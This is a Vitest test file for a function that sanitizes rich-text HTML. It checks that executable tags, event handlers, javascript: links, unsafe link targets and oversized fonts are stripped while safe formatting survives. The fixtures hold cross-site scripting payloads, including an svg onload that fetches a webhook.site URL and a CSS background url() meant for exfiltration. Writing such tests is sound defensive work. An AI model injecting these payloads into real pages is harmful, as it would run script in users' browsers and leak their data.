import { describe, expect, it } from "vitest";
import { sanitizeRichHtml } from "./sanitizeRichHtml";

describe("sanitizeRichHtml", () => {
  it("removes executable tags and event handlers", () => {
    const html = sanitizeRichHtml(
      "<svg onload=\"fetch('https://webhook.site/x')\"></svg>" +
        '<img src=x onerror="alert(1)">' +
        '<script>alert(1)</script><p onclick="alert(1)">Safe</p>',
    );

    expect(html).toBe("<p>Safe</p>");
  });

  it("removes unsafe links and CSS URL exfiltration", () => {
    const html = sanitizeRichHtml(
      '<a href="javascript:alert(1)" target="_blank">Link</a>' +
        '<span style="color:#112233;background:url(https://webhook.site/x)">Text</span>',
    );

    expect(html).toContain(
      '<a target="_blank" rel="noopener noreferrer">Link</a>',
    );
    expect(html).toContain('<span style="color:rgb(17, 34, 51)">Text</span>');
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("webhook.site");
  });

  it("keeps supported formatting", () => {
    expect(
      sanitizeRichHtml(
        '<h2 style="text-align:center">Title</h2><p><strong>Body</strong></p>',
      ),
    ).toBe(
      '<h2 style="text-align:center">Title</h2><p><strong>Body</strong></p>',
    );
  });

  it("keeps only bounded editor font sizes and approved link targets", () => {
    const html = sanitizeRichHtml(
      '<span style="font-size:100px">Large</span>' +
        '<span style="font-size:101px">Too large</span>' +
        '<a href="https://example.com" target="attacker-frame" rel="opener">Safe link</a>',
    );

    expect(html).toContain('<span style="font-size:100px">Large</span>');
    expect(html).toContain("<span>Too large</span>");
    expect(html).toContain('<a href="https://example.com">Safe link</a>');
    expect(html).not.toContain("opener");
  });
});
